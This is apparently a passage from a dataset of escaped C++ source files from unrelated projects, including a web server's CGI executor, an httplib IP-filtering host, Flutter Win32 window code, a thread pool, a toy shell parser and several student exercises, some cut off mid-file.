 if (this->execState == true)\n        this->freeArguments();\n}\n\nvoid        CGIexec::freeArguments(void)\n{\n    for (int i = 0; i < nbr_arg + 3; i++)\n        delete [] args[i];\n    delete [] args;\n}\n\nCGIexec&    CGIexec::operator=(CGIexec const &pointer)\n{\n    this->cgi_type = pointer.cgi_type;\n    this->cgi_path = pointer.cgi_path;\n    this->output = pointer.output;\n    this->nbr_arg = pointer.nbr_arg;\n    this->args = new char*[this->nbr_arg + 3];\n    for (int i = 0; i < nbr_arg + 3; i++)\n    {\n        this->args[i] = new char[std::strlen(pointer.args[i]) + 1];\n        std::strcpy(this->args[i], pointer.args[i]);\n    }\n    return (*this);\n}\n\nvoid    CGIexec::SetNumberArguments(std::map<std::string, std::string> _args)\n{\n    std::map<std::string, std::string>::iterator x;\n\n    x = _args.begin();\n    this->nbr_arg = 0;\n    for (; x != _args.end(); x++)\n        this->nbr_arg++;\n}\n\nvoid    CGIexec::SetType(std::string pathcgi, std::string _type)\n{\n    this->cgi_type = _type;\n\n    if (_type == \"*.php\")\n        this->cgi_type = \"php\";\n    else if (_type == \"*.py\")\n        this->cgi_type = \"python3\";\n    \n    if (pathcgi != \"\")\n        this->cgi_path = pathcgi;\n}\n\nvoid    CGIexec::SetArguments(std::map<std::string, std::string> _args, std::string exec)\n{\n    std::map<std::string, std::string>::iterator x;\n    int     i;\n\n    i = 0;\n    this->args = new char*[nbr_arg + 3];\n    this->args[i] = new char[this->cgi_type.length() + 1];\n    std::strcpy(this->args[i], this->cgi_type.c_str());\n    i++;\n    this->args[i] = new char[exec.length() + 1];\n    std::strcpy(this->args[i], exec.c_str());\n    i++;\n    x = _args.begin();\n    for (; x != _args.end(); i++) {\n        args[i] = new char[x->second.length() + 1];\n        std::strcpy(this->args[i], x->second.c_str());\n        if (!std::strcmp(this->args[i], \"%2B\"))\n            std::strcpy(this->args[i], \"+\");\n        x++;\n    }\n    this->args[i] = NULL;\n}\n\nstd::string     CGIexec::getOutput(void)\n{\n    return (this->output);\n}\n\nvoid            CGIexec::ExecCGI(void)\n{\n    ssize_t bytes_read;\n    char buffer[1024];\n    int pipe_fd[2];\n    int status;\n    \n    if (pipe(pipe_fd) == -1)\n    {\n        this->freeArguments();\n        throw(\"Error on pipe\");\n    }\n    fcntl(pipe_fd[0], F_SETFL, O_NONBLOCK);\n\n    pid_t child_pid = fork();\n    if (child_pid == -1)\n    {\n        this->freeArguments();\n        throw(\"Error on fork\");\n    }\n    if (child_pid == 0)\n    {\n        close(pipe_fd[0]);\n        dup2(pipe_fd[1], STDOUT_FILENO);\n        execve(this->cgi_path.c_str(), args, nullptr);\n        this->freeArguments();\n        std::cout << \"Error in execve... Cant exec CGI!\\n\";\n        exit(1);\n    }   \n    else \n    {\n        double wait_time = 20;\n\n        time_t start = std::time(nullptr);\n        close(pipe_fd[1]);   \n        while (true)\n        {\n            time_t now = std::time(nullptr);\n            double diff = now - start;\n            if (diff >= wait_time)\n            {\n                kill(child_pid, SIGKILL);\n\t\t\t\tthis->output.clear();\n                this->freeArguments();\n\t\t\t\tthrow(ErrorResponseException(\"508 Error: Loop Detected\"));\n                break;\n     ",
    "#include \"host.h\"\n#include \"../util/logger.h\"\n\nbool hosts::Host::isAllowed(const std::string &ipaddr) {\n    return allowedIps.find(ipaddr) != allowedIps.end();\n}\n\nvoid hosts::Host::run(httplib::Server &server, Loggable &loggable) {\n    filterByIp(server, loggable);\n    setupErrors(server, loggable);\n    setupRoutes(server, loggable);\n    std::string message = \"server listening on \" + ip + \":\" + std::to_string(port);\n    LOG_INFO(loggable, message.c_str());\n    server.listen(ip.c_str(), port);\n}\n\nvoid hosts::Host::filterByIp(httplib::Server &server, Loggable &loggable) {\n    server.set_logger([&loggable](auto &req, auto &res) {\n        std::string logMessage = req.remote_addr + \" \" + req.method + \" \" + req.path;\n        if (res.status != -1) {\n            logMessage += \" \" + std::to_string(res.status);\n        }\n        LOG_INFO(loggable, logMessage.c_str());\n        return logMessage;\n    });\n\n    server.set_pre_routing_handler([this, &loggable](const httplib::Request &req, httplib::Response &res) {\n        if (!isAllowed(req.remote_addr)) {\n            auto error = \"Unauthorized: \" + req.remote_addr;\n            LOG_ERROR(loggable, error.c_str());\n            res.status = 403;\n            res.set_content(error, \"text/plain\");\n            return httplib::Server::HandlerResponse::Handled;\n        }\n\n        return httplib::Server::HandlerResponse::Unhandled;\n    });\n}\n\nvoid hosts::Host::setupErrors(httplib::Server &server, Loggable &loggable) {\n    server.set_error_handler([&loggable](const httplib::Request &req, httplib::Response &res) {\n        auto ipAddr = \"IP:\" + req.get_header_value(\"REMOTE_ADDR\") + \" \";\n        auto methodAndPath = req.method + \" \" + req.path;\n        auto status = \" \" + std::to_string(res.status) + \"\";\n        auto logStr = ipAddr + methodAndPath + status;\n        std::string error = \"Error: \" + std::to_string(res.status) + \" - \" + res.reason;\n        LOG_ERROR(loggable, logStr.c_str());\n    });\n}\n\nvoid hosts::Host::setupRoutes(httplib::Server &server, Loggable &loggable) {\n    server.Get(\"/ping\", [&loggable](const httplib::Request &req, httplib::Response &res) {\n        LOG_INFO(loggable, \"Ping\");\n        res.set_content(\"Pong\", \"text/plain\");\n    });\n\n    server.Get(\"/health\", [&loggable](const httplib::Request &req, httplib::Response &res) {\n        LOG_INFO(loggable, \"Health\");\n        res.set_content(\"Healthy\", \"text/plain\");\n    });\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff\n\n#include <iostream>\nclass arr_error : public std::exception\n{\n\tstd::string message;\npublic:\n\tarr_error(const std::string& message) : message { message } {}\n\tconst char* what() const noexcept override\n\t{\n\t\treturn message.c_str();\n\t}\n};\nclass smart_array \n{\n\tint num_of_arr;\n\tint* arr=nullptr;\n\tint count{0};\npublic: \n\tsmart_array(int c) \n\t{\n\t\tnum_of_arr = c;\n\t\tint* arr_some = new int[num_of_arr] {};\n\t\tdelete[] arr;\n\t\tarr = arr_some;\n\t}\n\t~smart_array() { delete[] arr; }\n\n\tvoid add_element(int c)\n\t{\n\t\tif (count >= num_of_arr) \n\t\t{\n\t\t\tthrow arr_error(\"Array out of bonds\");\n\t\t\treturn;\n\t\t}\n\t\tarr[count] = c;\n\t\tcount++;\n\t}\n\tint get_element(int c) \n\t{ \n\t\tif (c > num_of_arr)\n\t\t{\n\t\t\tthrow arr_error(\"Wrong index\");\n\t\t\treturn -1;\n\t\t}\n\t\tc--;\n\t\treturn arr[c]; \n\t}\n};\n\nint main()\n{\n\ttry {\n\t\tsmart_array arr(5);\n\t\tarr.add_element(1);\n\t\tarr.add_element(4);\n\t\tarr.add_element(155);\n\t\tarr.add_element(14);\n\t\tarr.add_element(15);\n\n\t\tstd::cout << arr.get_element(1) << std::endl;\n\t\t\n\t}\n\tcatch (const std::exception& ex) {\n\t\tstd::cout << ex.what() << std::endl;\n\t}\n}",
    "#include \"ShoppingCart.h\"\n#include <iostream>\nusing namespace std;\n\nShoppingCart::ShoppingCart() : customerName(\"none\"), currentDate(\"January 1, 2016\") {}\n\nShoppingCart::ShoppingCart(const string& name, const string& date) : customerName(name), currentDate(date) {}\n\nstring ShoppingCart::GetCustomerName() const {\n    return customerName;\n}\n\nstring ShoppingCart::GetDate() const {\n    return currentDate;\n}\n\nvoid ShoppingCart::AddItem(const ItemToPurchase& item) {\n    cartItems.push_back(item);\n}\n\nvoid ShoppingCart::RemoveItem(const string& itemName) {\n    for (auto it = cartItems.begin(); it != cartItems.end(); ++it) {\n        if (it->GetName() == itemName) {\n            cartItems.erase(it);\n            return;\n        }\n    }\n    cout << \"Item not found in cart. Nothing removed.\" << endl;\n}\n\nvoid ShoppingCart::ModifyItem(const ItemToPurchase& item) {\n    bool found = false;\n    for (auto& cartItem : cartItems) {\n        if (cartItem.GetName() == item.GetName()) {\n            found = true;\n            if (item.GetDescription() != \"none\") cartItem.SetDescription(item.GetDescription());\n            if (item.GetPrice() != 0) cartItem.SetPrice(item.GetPrice());\n            if (item.GetQuantity() != 0) cartItem.SetQuantity(item.GetQuantity());\n        }\n    }\n    if (!found) {\n        cout << \"Item not found in cart. Nothing modified.\" << endl;\n    }\n}\n\nint ShoppingCart::GetNumItemsInCart() const {\n    int totalQuantity = 0;\n    for (const auto& item : cartItems) {\n        totalQuantity += item.GetQuantity();\n    }\n    return totalQuantity;\n}\n\ndouble ShoppingCart::GetCostOfCart() const {\n    double totalCost = 0;\n    for (const auto& item : cartItems) {\n        totalCost += item.GetQuantity() * item.GetPrice();\n    }\n    return totalCost;\n}\n\nvoid ShoppingCart::PrintTotal() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"Number of Items: \" << GetNumItemsInCart() << endl << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemCost();\n        }\n    }\n\n    cout << \"\\nTotal: $\" << GetCostOfCart() << endl;  \n} \n\nvoid ShoppingCart::PrintDescriptions() const {\n    cout << customerName << \"'s Shopping Cart - \" << currentDate << endl;\n    cout << \"\\nItem Descriptions\" << endl;\n\n    if (cartItems.empty()) {\n        cout << \"SHOPPING CART IS EMPTY\" << endl;\n    } else {\n        for (const auto& item : cartItems) {\n            item.PrintItemDescription();\n        }\n    }\n}\n\n",
    "#include <conio.h> // for _kbhit and _getch\r\n#include <Windows.h> // for sleep \r\n#include \"game.h\"\r\n#include <iostream>\r\n#include \"general.h\"\r\n\r\n\r\nint main()\r\n{\r\n    //TETRIS opening logo\r\n    std::cout << \" /$$$$$$$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$  /$$$$$$  /$$$$$$ \" << std::endl;\r\n    std::cout << \"|__  $$__/| $$_____/|__  $$__/| $$__  $$|_  $$_/ /$$__  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$  | $$  \\\\__/\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$      | $$   | $$$$$$$/  | $$  |  $$$$$$ \" << std::endl;\r\n    std::cout << \"   | $$   | $$__/      | $$   | $$__  $$  | $$   \\\\____  $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$         | $$   | $$  \\\\ $$  | $$   /$$  \\\\ $$\" << std::endl;\r\n    std::cout << \"   | $$   | $$$$$$$$   | $$   | $$  | $$ /$$$$$$|  $$$$$$/\" << std::endl;\r\n    std::cout << \"   |__/   |________/   |__/   |__/  |__/|______/ \\\\______/ \" << std::endl;\r\n\r\n    Sleep(1500);\r\n    clear_screen();\r\n\r\n   \r\n\tGame newGame;  \r\n    //game status returns true when the player want to quit the game\r\n    while (!newGame.getGameStatus()) \r\n    { \r\n\t    newGame.menu((int)gameOption::STARTGAME);\r\n    }\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include \"../include/thread_pool.h\"\n\nTask::Task(std::function<void()> &&__op, int __taskId) {\n  op = __op;\n  taskId = __taskId;\n}\n\nvoid ThreadPool::worker() {\n  while (GetStatus() == STATUS_WORKING) {\n    auto [task, taskId, ok] = opWithMutex(statusLock, [this]() {\n      if (this->taskQueue.empty()) {\n        return std::make_tuple(std::function<void()>{}, 0, false);\n      }\n      auto [task, id] = this->taskQueue.front();\n      this->taskQueue.pop();\n      return std::make_tuple(task, id, true);\n    });\n\n    if (!ok) {\n      std::this_thread::sleep_for(std::chrono::milliseconds(500));\n      continue;\n    }\n\n    auto future = std::async(std::launch::async, task);\n\n    try {\n      future.get();\n      Logger::info(\"Task processed success, id=\", taskId);\n    } catch (const std::exception &e) {\n      Logger::error(\"Task processed error, id=\", taskId, \", err=\", e.what());\n    }\n  }\n}\n\nThreadPool::ThreadPool(int threadCount) {\n  status = STATUS_STOPPED;\n  Start(threadCount);\n}\n\nint ThreadPool::GetStatus() {\n  return opWithMutex(statusLock, [this]() { return this->status; });\n}\n\nvoid ThreadPool::Shutdown() {\n  auto cnt = opWithMutex(statusLock, [this]() {\n    this->status = STATUS_STOPPED;\n    return this->taskQueue.size();\n  });\n  for (auto &thread : threads) {\n    if (thread.joinable()) {\n      thread.join();\n    }\n  }\n  threads.clear();\n  Logger::info(\"Thread pool shutdown, \", cnt, \" task in queue\");\n}\n\nThreadPool::~ThreadPool() { Shutdown(); }\n\nvoid ThreadPool::Start(int threadCount) {\n  opWithMutex(statusLock, [this, threadCount]() {\n    if (this->status == STATUS_WORKING) {\n      Logger::info(\"Thread pool has started\");\n      return;\n    }\n    this->status = STATUS_WORKING;\n    for (int i = 0; i < threadCount; i++) {\n      threads.emplace_back(&ThreadPool::worker, this);\n    }\n    Logger::info(\"Thread pool start\");\n  });\n}",
    "#include <iostream>\n#include <string>\n\n#include \"../include/commands.h\"\n#include \"../include/row_input_handle.h\"\n\n// finds matching service brackets (content in brackets has the highest \n// priority). Returns brackets substring, removing it from the source \n// string. If brackets substring is not found returns empty string\nstd::string split_brackets(std::string &src)\n{\n   std::string::size_type start_pos = find_symbol_position(src, \"(\");\n   std::string::size_type end_pos = reverse_find_symbol_position(src, \")\");\n   // if one of the positions npos - error, if start > end - error\n   // that kind of errors should be parced by raw input analysator\n   // these checks are not required.\n   if((start_pos != std::string::npos && end_pos != std::string::npos \n               && start_pos < end_pos))\n   {\n        // Brackets are deleted in src and results\n       std::string res = pop_substr(src, start_pos, end_pos);\n       // copies substring, deleting the first and the last symbols in the res\n       // string. 1 is symbol '(', 2 symbols is ')'.\n       return res.substr(1, res.length() - 2);\n   }\n   else\n   {\n       return \"\";\n   }\n}\n\nCommands split_delimiters(std::string &src) \n{\n    // block that finds the first occurance outside quotes of every delimiter\n    std::string::size_type and_pos = std::string::npos;\n    std::string::size_type or_pos = \n        find_symbol_position(src, Delimiters::OR);\n    std::string::size_type bg_mode_pos = \n        find_symbol_position(src, Delimiters::AMPERSAND);\n    std::string::size_type sequently_pos = \n        find_symbol_position(src, Delimiters::SEMICOLON);\n    // special case for && and &, the simplest way\n    if(bg_mode_pos != std::string::npos)\n    {\n        // if the first symbol is & and the next one is & we get &&\n        if(is_char_on_pos(src, bg_mode_pos + 1, '&')) {\n            and_pos = bg_mode_pos;\n            bg_mode_pos = std::string::npos;\n        }\n    }\n    // map for storing delimiter and its position\n    std::map<std::string, std::string::size_type> del_positions;\n    // sets postions of first occurance of Delimiters\n    del_positions.insert(std::make_pair(Delimiters::AND, and_pos));\n    del_positions.insert(std::make_pair(Delimiters::OR, or_pos));\n    del_positions.insert(std::make_pair(Delimiters::AMPERSAND, bg_mode_pos));\n    del_positions.insert(std::make_pair(Delimiters::SEMICOLON, sequently_pos));\n    // seeks for first delimiter in a provided string \n    std::string initial_key= \"\";\n    std::pair<std::string, std::string::size_type> minimum_value = \n        std::make_pair(initial_key, std::string::npos);\n    for(const std::pair<std::string, std::string::size_type> &d_pos : \n            del_positions)\n    {\n        if(d_pos.second < minimum_value.second)\n        {\n            minimum_value = std::make_pair(d_pos.first, d_pos.second);\n        }\n    }\n    std::string result;\n    if(minimum_value.second != std::string::npos) {\n        // Pops out a substring from the beggining till the first\n        // occurence of the delimiter. first.length() is used because \n        // delimitres can be different sizes\n        result = pop_substr(src, 0, \n                minimum_value.second + minimum_value.first.length() - 1);\n        // deletes delimiter from the substrin\n        result = result.substr(0, \n                result.length() - minimum_value.first.length());\n    }\n    else\n    {\n        // No delimitres case. Pops out the whole src to result\n        result = pop_substr(src, 0, src.length() - 1); \n    }\n    Commands command_instance(minimum_value.first);\n    command_instance.string_to_tokens(result);\n    return command_instance;\n}\n\n// splits user input into the simplest sets of commands\n// !!!!!\n// Commands is replaced for debug\n// recursivly disassembles input, initializes new Command objects\nvoid input_to_commands(std::vector<Commands> &coms_vec, \n        std::string &src)\n{\n\n    if(!src.empty())\n    {\n        std::string del = \"\";\n        coms_vec.push_back(split_delimiters(src));\n        input_to_commands(coms_vec, src);\n    }\n}\n\nint main()\n{\n    std::string input;\n    std::vector<Commands> commands_list;\n// testing spliting input into commands\n    getline(std::cin, input);\n/* Print test \n    while(input != \"exit\")\n    {\n        \n        input_to_commands(commands_list, input);\n        for(Commands &c : commands_list)\n        {\n            c.print_tokens();\n        }\n        commands_list.clear();\n        getline(std::cin, input);\n    }\n*/\n\n\twhile(input != \"exit\")\n    {\n        \n        input_to_commands(commands_list, input);\n        for(Commands &c : commands_list)\n        {\n            c.execute_commands();\n        }\n        commands_list.clear();\n        getline(std::cin, input);\n    }\n    return 0;\n}\n",
    "// NAME: \n// NUSNET ID: \n// PLAB USERID: \n\n// FILE: package.cpp\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\n#include <cmath>    // for the ceil() function.\nusing namespace std;\n\n\n// CuboidObject class\nclass CuboidObject\n{\nprotected:\n    double _length, _width, _height, _mass;\npublic:\n    CuboidObject() {}\n    CuboidObject( double length, double width, double height, double mass )\n      : _length(length), _width(width), _height(height), _mass(mass) {}\n\n    double getLength() { return _length; }\n    double getWidth()  { return _width; }\n    double getHeight() { return _height; }\n    double getVolume() { return _length * _width * _height; }\n    double getMass()   { return _mass; }\n};\n\n\n// Book class\nclass Book : public CuboidObject\n{\nprivate:\n    string _title;\npublic:\n    Book( string title, double length, double width, \n          double height, double mass )\n      : CuboidObject( length, width, height, mass ), _title(title) {}\n\n    string getTitle() { return _title; }\n};\n\n\n// Package class\nclass Package : public CuboidObject\n{\nprivate:\n    vector<Book*> _books;\n\n    // _improvedLength and _improvedWidth contain the length and \n    // width of the package when the improved packing method is used.\n    double _improvedLength, _improvedWidth;\n\n    // _length and _width from CuboidObject contain the length and\n    // width of the package when the standard packing method is used.\n\n    void _computeStandardLengthWidth();\n    void _computeImprovedLengthWidth();\n\npublic:\n    Package( vector<Book*> &books );\n    vector<Book*>& getBooks() { return _books; }\n    double getImprovedLength() { return _improvedLength; }\n    double getImprovedWidth()  { return _improvedWidth; }\n};\n\n\n// Constructor of Package.\n\nPackage::Package( vector<Book*> &books ) : _books(books)\n{\n    // Write your code here.\n    _height = 0.0;\n    _mass = 0.0;\n    for ( unsigned int i = 0; i < _books.size(); i++ ) {\n        _height += _books[i]->getHeight();\n        _mass += books[i]->getMass();\n    }\n    _computeStandardLengthWidth();\n    _computeImprovedLengthWidth();\n}\n\n\n// Sets _length and _width to the length and width of the package\n// produced using the standard packing method.\n\nvoid Package::_computeStandardLengthWidth()\n{\n    // Write your code here.\n    _length = 0.0;\n    _width = 0.0;\n    for ( unsigned int i = 0; i < _books.size(); i++ ) {\n        if ( _books[i]->getLength() > _length )\n            _length = _books[i]->getLength();\n        if ( _books[i]->getWidth() > _width )\n            _width = _books[i]->getWidth();\n    }\n}\n\n\n// Sets _improvedLength and _improvedWidth to the length and width \n// of the package produced using the improved packing method.\n\nvoid Package::_computeImprovedLengthWidth()\n{\n    // Write your code here.\n    _improvedLength = 0.0;\n    _improvedWidth = 0.0;\n    for ( unsigned int i = 0; i < _books.size(); i++ ) {\n        double longer, shorter;\n        if ( _books[i]->getLength() > _books[i]->getWidth() ) {\n            longer = _books[i]->getLength();\n            shorter = _books[i]->getWidth();\n        } else {\n            longer = _books[i]->getWidth();\n            shorter = _books[i]->getLength();\n        }\n\n        if ( longer > _improvedLength )\n            _improvedLength = longer;\n        if ( shorter > _improvedWidth )\n            _improvedWidth = shorter;\n    }\n}\n\n\n// Returns the billable mass of the input package.\n\ndouble computeBillableMass( Package &package )\n{\n    const double volMassFactor = 500.0;\n\n    // Write your code here.\n    double volMass = package.getVolume() * volMassFactor;\n\n    if ( package.getMass() > volMass )\n        return package.getMass();\n    else\n        return volMass;\n}\n\n\n// Returns the shipping charge given the billable mass.\n\ndouble computeShippingCharge( double billableMass )\n{\n    // Write your code here.\n    billableMass = ceil(billableMass);\n    double sum = 0.0;\n\n    if (billableMass > 0.0) {\n        sum = sum + 1.0 * 1.0;\n        billableMass = billableMass - 1.0;\n    }\n    if (billableMass > 0.0) {\n        sum = sum + 1.0 * 0.8;\n        billableMass = billableMass - 1.0;\n    }\n    if (billableMass > 0.0) {\n        sum = sum + 1.0 * 0.6;\n        billableMass = billableMass - 1.0;\n    }\n    if (billableMass > 0.0) {\n        sum = sum + billableMass * 0.4;\n        billableMass = 0.0;\n    }\n    return sum;\n}\n\n\nint main()\n{\n    vector<Book*> books;\n\n    // Write your code here to read the inputs.\n    int numBooks;\n    cin >> numBooks;\n\n    for (int i = 0; i < numBooks; i++ ) {\n        string title;\n        double length, width, height, mass;\n        cin >> title >> length >> width >> height >> mass;\n        Book *newBook = new Book( title, length, width, height, mass );\n        books.push_back( newBook );\n    }\n\n    // Outputs\n    Package package( books );\n    double billableMass = computeBillableMass( package );\n    double shippingCharge = computeShippingCharge( billableMass );\n\n    cout << setprecision(2) << fixed;\n    cout << \"Package standa",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 R. Kuemmerle, G. Grisetti, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"parameter.h\"\n\nnamespace g2o {\n\n  Parameter::Parameter() : _id(-1)\n  {\n  }\n\n  void Parameter::setId(int id_)\n  {\n    _id = id_;\n  }\n  \n} // end namespace\n",
